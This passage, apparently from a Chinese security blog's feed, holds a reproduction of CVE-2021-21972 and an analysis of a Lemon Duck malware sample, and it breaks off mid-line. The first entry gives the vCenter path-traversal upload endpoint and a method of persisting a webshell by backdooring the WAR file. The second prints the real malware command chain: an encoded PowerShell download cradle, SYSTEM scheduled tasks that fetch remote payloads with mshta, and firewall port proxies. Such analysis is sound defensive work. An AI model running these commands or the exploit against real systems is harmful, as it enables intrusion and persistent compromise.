174694f7ccc08b5d9bfe0cb69783c4b9b16dbe845241870a26b5aee0b4ef4a4715ef5c93df33638d7e07aea5e551b948a3a55a2ab34dff2e773c0f6cf10c4ac2279edb138ef80e54716b84b15c0977bf9b6314b98d2945ee13286b4135500c2b8dd6ca465fa42b23bd65d4d1a2c31ae49fa04e8897fc5ed6f37911b54d59fcea22a01e98633c8f5345d4012597be76503d99480c9e94c1c6214b5aef41457caccdf04afbda8ef38c7336b2b0bbe28d6300fb17186bbc55a3ddea8c2e58299fae27794f3ce121d6feecfd8d226ad9946adaaaf6b3d19bf3632581e62708e7ed7337303</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-wave">      <input class="hbe hbe-input-field hbe-input-field-wave" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-wave" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-wave">您好, 这里需要密码.</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-wave" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日常 </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2021-21972 复现和分析</title>
      <link href="/p/7cb6.html"/>
      <url>/p/7cb6.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-背景"><a href="#0x01-背景" class="headerlink" title="0x01 背景"></a>0x01 背景</h1><p><code>vSphere</code>是<code>VMware</code>推出的虚拟化平台套件，包含<code>ESXi</code>、<code>vCenter Server</code>等一系列的软件。其中<code>vCenter Server</code>为<code> ESXi</code>的控制中心，可从单一控制点统一管理数据中心的所有<code>vSphere</code>主机和虚拟机，使得<code>IT</code>管理员能够提高控制能力，简化入场任务，并降低<code>IT</code>环境的管理复杂性与成本。</p><p><code>vSphere Client（HTML5）</code>在<code>vCenter Server</code>插件中存在一个远程执行代码漏洞。未授权的攻击者可以通过开放<code>443</code>端口的服务器向<code>vCenter Server</code>发送精心构造的请求，从而在服务器上写入<code>webshell</code>，最终造成远程任意代码执行。</p><h1 id="0x02-代码分析"><a href="#0x02-代码分析" class="headerlink" title="0x02 代码分析"></a>0x02 代码分析</h1><p><code>vCenter Server</code>的<code>vROPS</code>插件的<code>API</code>未经过鉴权，存在一些敏感接口。其中 <code>uploadova</code> 接口存在一个上传 OVA 文件的功能：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(</span></span><br><span class="line"><span class="meta">   value = &#123;&quot;/uploadova&quot;&#125;,</span></span><br><span class="line"><span class="meta">   method = &#123;RequestMethod.POST&#125;</span></span><br><span class="line"><span class="meta">)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">uploadOvaFile</span><span class="params">(<span class="meta">@RequestParam(value = &quot;uploadFile&quot;,required = true)</span> CommonsMultipartFile uploadFile, HttpServletResponse response)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">   logger.info(<span class="string">&quot;Entering uploadOvaFile api&quot;</span>);</span><br><span class="line">   <span class="type">int</span> <span class="variable">code</span> <span class="operator">=</span> uploadFile.isEmpty() ? <span class="number">400</span> : <span class="number">200</span>;</span><br><span class="line">   <span class="type">PrintWriter</span> <span class="variable">wr</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (code != <span class="number">200</span>) &#123;</span><br><span class="line">         response.sendError(code, <span class="string">&quot;Arguments Missing&quot;</span>);</span><br><span class="line">         <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      wr = response.getWriter();</span><br><span class="line">   &#125; <span class="keyword">catch</span> (IOException var14) &#123;</span><br><span class="line">      var14.printStackTrace();</span><br><span class="line">      logger.info(<span class="string">&quot;upload Ova Controller Ended With Error&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   response.setStatus(code);</span><br><span class="line">   <span class="type">String</span> <span class="variable">returnStatus</span> <span class="operator">=</span> <span class="string">&quot;SUCCESS&quot;</span>;</span><br><span class="line">   <span class="keyword">if</span> (!uploadFile.isEmpty()) &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">         logger.info(<span class="string">&quot;Downloading OVA file has been started&quot;</span>);</span><br><span class="line">         logger.info(<span class="string">&quot;Size of the file received  : &quot;</span> + uploadFile.getSize());</span><br><span class="line">         <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> uploadFile.getInputStream();</span><br><span class="line">         <span class="type">File</span> <span class="variable">dir</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;/tmp/unicorn_ova_dir&quot;</span>);</span><br><span class="line">         <span class="keyword">if</span> (!dir.exists()) &#123;</span><br><span class="line">            dir.mkdirs();</span><br><span class="line">         &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            String[] entries = dir.list();</span><br><span class="line">            String[] var9 = entries;</span><br><span class="line">            <span class="type">int</span> <span class="variable">var10</span> <span class="operator">=</span> entries.length;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">var11</span> <span class="operator">=</span> <span class="number">0</span>; var11 &lt; var10; ++var11) &#123;</span><br><span class="line">               <span class="type">String</span> <span class="variable">entry</span> <span class="operator">=</span> var9[var11];</span><br><span class="line">               <span class="type">File</span> <span class="variable">currentFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(dir.getPath(), entry);</span><br><span class="line">               currentFile.delete();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            logger.info(<span class="string">&quot;Successfully cleaned : /tmp/unicorn_ova_dir&quot;</span>);</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         <span class="type">TarArchiveInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TarArchiveInputStream</span>(inputStream);</span><br><span class="line">         <span class="type">TarArchiveEntry</span> <span class="variable">entry</span> <span class="operator">=</span> in.getNextTarEntry();</span><br><span class="line">         <span class="type">ArrayList</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line"></span><br><span class="line">         <span class="keyword">while</span>(entry != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (entry.isDirectory()) &#123;</span><br><span class="line">               entry = in.getNextTarEntry();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="type">File</span> <span class="variable">curfile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;/tmp/unicorn_ova_dir&quot;</span>, entry.getName());</span><br><span class="line">               <span class="type">File</span> <span class="variable">parent</span> <span class="operator">=</span> curfile.getParentFile();</span><br><span class="line">               <span class="keyword">if</span> (!parent.exists()) &#123;</span><br><span class="line">                  parent.mkdirs();</span><br><span class="line">               &#125;</span><br><span class="line"></span><br><span class="line">               <span class="type">OutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(curfile);</span><br><span class="line">               IOUtils.copy(in, out);</span><br><span class="line">               out.close();</span><br><span class="line">               result.add(entry.getName());</span><br><span class="line">               entry = in.getNextTarEntry();</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         in.close();</span><br><span class="line">         logger.info(<span class="string">&quot;Successfully deployed File at Location :/tmp/unicorn_ova_dir&quot;</span>);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (Exception var15) &#123;</span><br><span class="line">         logger.error(<span class="string">&quot;Unable to upload OVA file :&quot;</span> + var15);</span><br><span class="line">         returnStatus = <span class="string">&quot;FAILED&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   wr.write(returnStatus);</span><br><span class="line">   wr.flush();</span><br><span class="line">   wr.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码逻辑是将<code>TAR</code>文件解压后上传到 <code>/tmp/unicorn_ova_dir</code> 目录。注意到如下代码：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span>(entry != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (entry.isDirectory()) &#123;</span><br><span class="line">        entry = in.getNextTarEntry();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">File</span> <span class="variable">curfile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;/tmp/unicorn_ova_dir&quot;</span>, entry.getName());</span><br><span class="line">        <span class="type">File</span> <span class="variable">parent</span> <span class="operator">=</span> curfile.getParentFile();</span><br><span class="line">        <span class="keyword">if</span> (!parent.exists()) &#123;</span><br><span class="line">            parent.mkdirs();</span><br></pre></td></tr></table></figure><p>直接将<code>TAR</code>的文件名与 <code>/tmp/unicorn_ova_dir</code> 拼接并写入文件。如果文件名内存在 <code>../</code> 即可实现目录遍历。</p><h1 id="0x03-影响版本"><a href="#0x03-影响版本" class="headerlink" title="0x03 影响版本"></a>0x03 影响版本</h1><ul><li><code>vcenter_server</code> 7.0 U1c 之前的 7.0 版本</li><li><code>vcenter_server</code> 6.7 U3l 之前的 6.7 版本</li><li><code>vcenter_server</code> 6.5 U3n 之前的 6.5 版本</li></ul><h1 id="0x04-复现"><a href="#0x04-复现" class="headerlink" title="0x04 复现"></a>0x04 复现</h1><p>以<code>VMware-VCSA-all-6.7.0-8217866</code>为例，<code>web</code>的资源目录为<code>/usr/lib/vmware-vsphere-ui/server/work/deployer/s/global/&#123;REPLACE_RANDOM_ID_HERE&#125;/0/h5ngc.war/resources/</code></p><p>向<code>https://VCIP/ui/vropspluginui/rest/services/uploadova</code>发送POST请求,<code>tar</code>包内容为带有目录穿越的<code>shell</code>，</p><p><img src="/images/image-20210227234148006.png" alt="image-20210227234148006"></p><p>上传成功会返回<code>SUCCESS</code></p><p>访问上传的shell</p><p><img src="/images/image-20210227234950695.png" alt="image-20210227234950695"></p><h1 id="0x05-VMware的骚操作"><a href="#0x05-VMware的骚操作" class="headerlink" title="0x05 VMware的骚操作"></a>0x05 VMware的骚操作</h1><p>在<code>vSphere vCenter</code>6.7 U2的某个分支里，VM官方搞了个骚操作导致6.7U2+无法通过上传<code>webshell</code>的形式去获取<code>vCenter</code>权限，以下为启动前端UI的命令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/java/jre-vmware/bin/vsphere-ui.launcher</span><br><span class="line">-Xmx597m</span><br><span class="line">-XX:CompressedClassSpaceSize=256m</span><br><span class="line">-Xss320k</span><br><span class="line">-XX:ParallelGCThreads=1</span><br><span class="line">-Djava.io.tmpdir=/usr/lib/vmware-vsphere-ui/server/work/tmp</span><br><span class="line">-Dorg.eclipse.virgo.kernel.home=/usr/lib/vmware-vsphere-ui/server</span><br><span class="line">-DPS_BASEDIR=/storage/vsphere-ui/</span><br><span class="line">-Declipse.ignoreApp=true</span><br><span class="line">-Dcatalina.base=/usr/lib/vmware-vsphere-ui/server</span><br><span class="line">-XX:+HeapDumpOnOutOfMemoryError</span><br><span class="line">-XX:HeapDumpPath=/var/log/vmware/vsphere-ui/</span><br><span class="line">-XX:ErrorFile=/var/log/vmware/vsphere-ui/java_error%p.log</span><br><span class="line">-XX:+PrintGCDetails</span><br><span class="line">-XX:+PrintGCDateStamps</span><br><span class="line">-XX:+PrintReferenceGC</span><br><span class="line">-XX:+UseGCLogFileRotation</span><br><span class="line">-XX:NumberOfGCLogFiles=10</span><br><span class="line">-XX:GCLogFileSize=1024K</span><br><span class="line">-XX:-OmitStackTraceInFastThrow</span><br><span class="line">-Xloggc:/var/log/vmware/vsphere-ui/vsphere-ui-gc.log</span><br><span class="line">-Djava.security.properties=/etc/vmware/java/vmware-override-java.security</span><br><span class="line">-Djava.ext.dirs=/usr/java/jre-vmware/lib/ext:/usr/java/packages/lib/ext:/opt/vmware/jre_ext/</span><br><span class="line">-Dorg.osgi.framework.system.packages.extra=sun.misc</span><br><span class="line">-Dsun.zip.disableMemoryMapping=true</span><br><span class="line">-Dui.component.name=vsphere-ui</span><br><span class="line">-Dvlsi.client.vecs.certstore=false</span><br><span class="line">-DisFling=false</span><br><span class="line">-Dorg.apache.tomcat.websocket.DISABLE_BUILTIN_EXTENSIONS=true</span><br><span class="line">-Dlogback.configurationFile=/usr/lib/vmware-vsphere-ui/server/conf/serviceability.xml</span><br><span class="line">-Dlogs.dir=/var/log/vmware/vsphere-ui/logs/</span><br><span class="line">-Dhttps.port=5443</span><br><span class="line">-Dhttp.port=5090</span><br><span class="line">-Dshutdown.port=-1</span><br><span class="line">-Dcom.sun.org.apache.xml.internal.security.ignoreLineBreaks=true</span><br><span class="line">-Dorg.apache.xml.security.ignoreLineBreaks=true</span><br><span class="line">-classpath</span><br><span class="line">/usr/lib/vmware-vsphere-ui/server/bootstrap/server-launcher.jar:/usr/lib/vmware-vsphere-ui/server/bin/bootstrap.jar:/usr/lib/vmware-vsphere-ui/server/bin/tomcat-juli.jar</span><br><span class="line">com.vmware.vise.launcher.tomcat.TomcatLauncher</span><br><span class="line">start</span><br></pre></td></tr></table></figure><p>注意<code>server-launcher.jar</code>这个包调用了<code>com.vmware.vise.launcher.tomcat.TomcatLauncher</code>类，反编译后部分代码如下</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">TomcatLauncher</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">VECS_KEYSTORE_TYPE</span> <span class="operator">=</span> <span class="string">&quot;VKS&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">MACHINE_SSL_CERT</span> <span class="operator">=</span> <span class="string">&quot;MACHINE_SSL_CERT&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">VECS_LOAD_STORE_PARAM_TYPE</span> <span class="operator">=</span> <span class="string">&quot;com.vmware.provider.VecsLoadStoreParameter&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String FILE_SEPARATOR;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">SYSPROP_COMPONENT_NAME</span> <span class="operator">=</span> <span class="string">&quot;ui.component.name&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">DEFAULT_COMPONENT_NAME</span> <span class="operator">=</span> <span class="string">&quot;vsphere-ui&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String CLIENT_APP_DATA_FOLDER;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">DEST_KEYSTORE_NAME</span> <span class="operator">=</span> <span class="string">&quot;keystore.jks&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String PASSWORD;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">TOMCAT_DIR</span> <span class="operator">=</span> <span class="string">&quot;catalina.base&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String CONFIG_DIR;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> &#123;</span><br><span class="line">        loadKeystore();</span><br><span class="line">        deleteWorkDirectory();</span><br><span class="line">        createJavaTempDir();</span><br><span class="line">        Bootstrap.main(args);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>其中有个函数<code>deleteWorkDirectory</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deleteWorkDirectory</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">File</span> <span class="variable">workDir</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(System.getProperty(<span class="string">&quot;catalina.base&quot;</span>) + <span class="string">&quot;/work&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!workDir.exists()) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        deleteDirectoryRecur(workDir);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;Cannot clean work dir&quot;</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数主要作用就是删除<code>web</code>目录，先从命令行中的<code>catalina.base</code>获取设置的<code>Tomcat</code>工作目录<code>/usr/lib/vmware-vsphere-ui/server</code>，然后拼接<code>/work</code>路径并判断是否存在，不存在则返回，存在的调用<code>deleteDirectoryRecur</code>函数进行删除</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deleteDirectoryRecur</span><span class="params">(<span class="keyword">final</span> File directory)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">final</span> File[] contents = directory.listFiles();</span><br><span class="line">    <span class="keyword">if</span> (contents != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">final</span> File f : contents) &#123;</span><br><span class="line">            <span class="keyword">if</span> (isSymlink(f)) &#123;</span><br><span class="line">                f.delete();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                deleteDirectoryRecur(f);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    directory.delete();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isSymlink</span><span class="params">(<span class="keyword">final</span> File file)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NullPointerException</span>(<span class="string">&quot;File must not be null&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    File canon;</span><br><span class="line">    <span class="keyword">if</span> (file.getParent() == <span class="literal">null</span>) &#123;</span><br><span class="line">        canon = file;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">File</span> <span class="variable">canonDir</span> <span class="operator">=</span> file.getParentFile().getCanonicalFile();</span><br><span class="line">        canon = <span class="keyword">new</span> <span class="title class_">File</span>(canonDir, file.getName());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> !canon.getCanonicalFile().equals(canon.getAbsoluteFile());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这也是为什么6.7U2+、7.0+的版本无法进行常规写shell的操作原因。</p><p>但是问题来了，实际发现<code>tomcat</code>并没有启动</p><p><img src="/images/image-20210228110129479.png" alt="image-20210228110129479"></p><h1 id="0x06-柳暗花明"><a href="#0x06-柳暗花明" class="headerlink" title="0x06 柳暗花明"></a>0x06 柳暗花明</h1><p>经过分析启动进程<code>rhttpproxy</code>，发现该进程将443请求转发到5090端口</p><p><img src="/images/image-20210228110251923.png" alt="image-20210228110251923"></p><p>这和启动进程的参数吻合</p><p>经过后续的分析，发现了一种有条件写<code>shell</code>的操作，<code>vCenter</code>在重启时会启动服务，但是在启动服务的过程中会调用<code>war</code>包重新生成<code>web</code>目录，这就可以给我们一个可乘之机</p><p>查看<code>war</code>包权限</p><p><img src="/images/image-20210228000158942.png" alt="image-20210228000158942"></p><p><code>770</code>权限，那么我们可以先把该文件下载回本地进行加料，再利用<code>CVE-2021-21792</code>漏洞回传回<code>vCener</code>服务器进行复写操作，等待<code>vCenter</code>重启时就会在内存中驻留我们的webshell</p><p>成功如图</p><p><img src="/images/image-20210228000400112.png" alt="image-20210228000400112"></p><h1 id="0x07-EXP"><a href="#0x07-EXP" class="headerlink" title="0x07 EXP"></a>0x07 EXP</h1><p><a href="https://github.com/NS-Sp4ce/CVE-2021-21972">https://github.com/NS-Sp4ce/CVE-2021-21972</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日常 </tag>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>柠檬鸭组织样本分析</title>
      <link href="/p/6d37.html"/>
      <url>/p/6d37.html</url>
      
        <content type="html"><![CDATA[<h1 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h1><p><img src="/images/image-20201231143926204.png" alt="image-20201231143926204"></p><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><h2 id="1-txt"><a href="#1-txt" class="headerlink" title="1.txt"></a>1.txt</h2><p>文本内容如下</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cmd /c <span class="built_in">echo</span> RmMrcM &gt;&gt; c:\windows\temp\msInstall.exe&amp;<span class="built_in">echo</span> copy /y c:\windows\temp\msInstall.exe c:\windows\kNnk.exe&gt;c:/windows/temp/p.bat&amp;<span class="built_in">echo</span> <span class="string">&quot;*&quot;</span> &gt;c:\windows\temp\eb.txt&amp;<span class="built_in">echo</span> netsh interface ipv6 install &gt;&gt;c:/windows/temp/p.bat &amp;<span class="built_in">echo</span> netsh firewall add portopening tcp 65532 DNS2  &gt;&gt;c:/windows/temp/p.bat&amp;<span class="built_in">echo</span> netsh interface portproxy add v4tov4 listenport=65532 connectaddress=1.1.1.1 connectport=53 &gt;&gt;c:/windows/temp/p.bat&amp;<span class="built_in">echo</span> netsh firewall add portopening tcp 65531 DNSS2  &gt;&gt;c:/windows/temp/p.bat&amp;<span class="built_in">echo</span> netsh interface portproxy add v4tov4 listenport=65531 connectaddress=1.1.1.1 connectport=53 &gt;&gt;c:/windows/temp/p.bat&amp;<span class="built_in">echo</span> netsh firewall add portopening tcp 65529 DNSS3  &gt;&gt;c:/windows/temp/p.bat&amp;<span class="built_in">echo</span> netsh interface portproxy add v4tov4 listenport=65529 connectaddress=1.1.1.1 connectport=53 &gt;&gt;c:/windows/temp/p.bat&amp;<span class="built_in">echo</span> <span class="keyword">if</span> exist C:/windows/system32/WindowsPowerShell/ (powershell -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAHQALgBhAG0AeQBuAHgALgBjAG8AbQAvAGcAaQBtAC4AagBzAHAAJwApAA==^&amp;schtasks /create /ru system /sc MINUTE /mo 60 /st 07:05:00 /tn BIzdRfgY /tr <span class="string">&quot;c:\windows\kNnk.exe&quot;</span> /F) <span class="keyword">else</span> start /b sc start Schedule^&amp;ping localhost^&amp;sc query Schedule^|findstr RUNNING^&amp;^&amp;^(schtasks /delete /TN Autocheck /f^&amp;schtasks /create /ru system /sc MINUTE /mo 50 /ST 07:00:00 /TN Autocheck /tr <span class="string">&quot;cmd.exe /c mshta http://w.zz3r0.com/page.html?pBS_S-AUDIT&quot;</span>^&amp;schtasks /run /TN Autocheck^&amp;schtasks /delete /TN BIzdRfgY /f^&amp;schtasks /create /ru system /sc MINUTE /mo 50 /ST 07:00:00 /TN BIzdRfgY /tr <span class="string">&quot;c:\windows\kNnk.exe&quot;</span>^&amp;schtasks /run /TN BIzdRfgY^&amp;schtasks /delete /TN Autoload /f^&amp;schtasks /create /ru system /sc MINUTE /mo 10 /ST 07:00:00 /TN Autoload /tr <span class="string">&quot;c:\windows\temp\installed.exe&quot;</span>^&amp;schtasks /run /TN Autoload^) &gt;&gt;c:/windows/temp/p.bat&amp;<span class="built_in">echo</span> net start Ddriver &gt;&gt;c:/windows/temp/p.bat&amp;<span class="built_in">echo</span> <span class="keyword">for</span> /f  %%i <span class="keyword">in</span> (<span class="string">&#x27;tasklist ^^^| find /c /i &quot;cmd.exe&quot;&#x27;</span>^) <span class="keyword">do</span> <span class="built_in">set</span> s=%%i &gt;&gt;c:/windows/temp/p.bat&amp;<span class="built_in">echo</span> <span class="keyword">if</span> %s% gtr 10 (shutdown /r) &gt;&gt;c:/windows/temp/p.bat&amp;<span class="built_in">echo</span> del c:\windows\temp\p.bat&gt;&gt;c:/windows/temp/p.bat&amp;<span class="built_in">echo</span> c:\windows\temp\installed.exe&gt;&gt;c:/windows/temp/p.bat&amp;cmd.exe /c c:/windows/temp/p.bat&amp;cmd /c c:\windows\temp\installed.exe</span><br></pre></td></tr></table></figure><p>简单格式化下</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cmd /c <span class="built_in">echo</span> RmMrcM &gt;&gt; c:\windows\temp\msInstall.exe&amp; </span><br><span class="line"><span class="built_in">echo</span> copy /y c:\windows\temp\msInstall.exe c:\windows\kNnk.exe&gt;c:/windows/temp/p.bat&amp;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;*&quot;</span> &gt;c:\windows\temp\eb.txt&amp;</span><br><span class="line">//配置网卡、防火墙</span><br><span class="line"><span class="built_in">echo</span> netsh interface ipv6 install &gt;&gt;c:/windows/temp/p.bat &amp;</span><br><span class="line"><span class="built_in">echo</span> netsh firewall add portopening tcp 65532 DNS2  &gt;&gt;c:/windows/temp/p.bat&amp;</span><br><span class="line"><span class="built_in">echo</span> netsh interface portproxy add v4tov4 listenport=65532 connectaddress=1.1.1.1 connectport=53 &gt;&gt;c:/windows/temp/p.bat&amp;</span><br><span class="line"><span class="built_in">echo</span> netsh firewall add portopening tcp 65531 DNSS2  &gt;&gt;c:/windows/temp/p.bat&amp;</span><br><span class="line"><span class="built_in">echo</span> netsh interface portproxy add v4tov4 listenport=65531 connectaddress=1.1.1.1 connectport=53 &gt;&gt;c:/windows/temp/p.bat&amp;</span><br><span class="line"><span class="built_in">echo</span> netsh firewall add portopening tcp 65529 DNSS3  &gt;&gt;c:/windows/temp/p.bat&amp;</span><br><span class="line"><span class="built_in">echo</span> netsh interface portproxy add v4tov4 listenport=65529 connectaddress=1.1.1.1 connectport=53 &gt;&gt;c:/windows/temp/p.bat&amp;</span><br><span class="line">//powershell命令</span><br><span class="line"><span class="built_in">echo</span> <span class="keyword">if</span> exist C:/windows/system32/WindowsPowerShell/ (powershell -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAHQALgBhAG0AeQBuAHgALgBjAG8AbQAvAGcAaQBtAC4AagBzAHAAJwApAA==^&amp;</span><br><span class="line">//计划任务配置</span><br><span class="line">schtasks /create /ru system /sc MINUTE /mo 60 /st 07:05:00 /tn BIzdRfgY /tr <span class="string">&quot;c:\windows\kNnk.exe&quot;</span> /F) <span class="keyword">else</span> start /b sc start Schedule^&amp;</span><br><span class="line">ping localhost^&amp;</span><br><span class="line">//检查定时任务是否已启动</span><br><span class="line">sc query Schedule^|findstr RUNNING^&amp;</span><br><span class="line">^&amp;</span><br><span class="line">^(schtasks /delete /TN Autocheck /f^&amp;</span><br><span class="line">//mshta下载马，截至分析时已无法访问</span><br><span class="line">schtasks /create /ru system /sc MINUTE /mo 50 /ST 07:00:00 /TN Autocheck /tr <span class="string">&quot;cmd.exe /c mshta http://w.zz3r0.com/page.html?pBS_S-AUDIT&quot;</span>^&amp;</span><br><span class="line">//计划任务操作项</span><br><span class="line">schtasks /run /TN Autocheck^&amp;</span><br><span class="line">schtasks /delete /TN BIzdRfgY /f^&amp;</span><br><span class="line">schtasks /create /ru system /sc MINUTE /mo 50 /ST 07:00:00 /TN BIzdRfgY /tr <span class="string">&quot;c:\windows\kNnk.exe&quot;</span>^&amp;</span><br><span class="line">schtasks /run /TN BIzdRfgY^&amp;</span><br><span class="line">schtasks /delete /TN Autoload /f^&amp;</span><br><span class="line">schtasks /create /ru system /sc MINUTE /mo 10 /ST 07:00:00 /TN Autoload /tr <span class="string">&quot;c:\windows\temp\installed.exe&quot;</span>^&amp;</span><br><span class="line">schtasks /run /TN Autoload^) &gt;&gt;c:/windows/temp/p.bat&amp;</span><br><span 